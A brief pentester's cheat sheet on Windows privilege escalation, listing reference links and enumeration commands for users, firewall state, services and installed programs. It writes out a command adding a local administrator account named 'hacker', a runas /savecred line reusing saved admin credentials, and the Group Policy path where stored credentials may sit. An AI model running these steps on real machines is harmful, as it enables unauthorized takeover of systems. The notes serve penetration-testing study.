# Windows priv esc

## LINKS

* https://xapax.gitbooks.io/security/content/privilege_escalation_windows.html << CHECK THIS
* https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
* https://xor.cat/2017/09/05/sysinternals-accesschk-accepteula/
* https://support.microsoft.com/en-us/help/251192/how-to-create-a-windows-service-by-using-sc-exe


## Who are you, are you system ?
echo %username%
net user <user>

## what users on the system?
net users
net localgroups

## What is the windows version?
EULA.txt, sysinfo

## Can you add an admin user?
net users hacker pass /add
net localgroup administrators hacker /add

## Firewall
netsh firewall show state
netsh firewall show config

## can we runas ?
https://ss64.com/nt/runas.html
This was working on a machine : 

```
runas /user:administrator /savecred "c:\users\security\downloads\wsrt.exe"
```

## powersploit
https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

## Group policies ?
C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Group

## Can we remplace a service?
Uee accesschk to search writables services
accesschk.exe -uwcqv "testuser" * 

## What services are accessible from inside?
netstat -aon

## Is there any useful tool?
python, perl, ...

## What programs are installeds?
dir c:\prograam files

search for local exploits on this programs

## what on users homes?
any useful info?

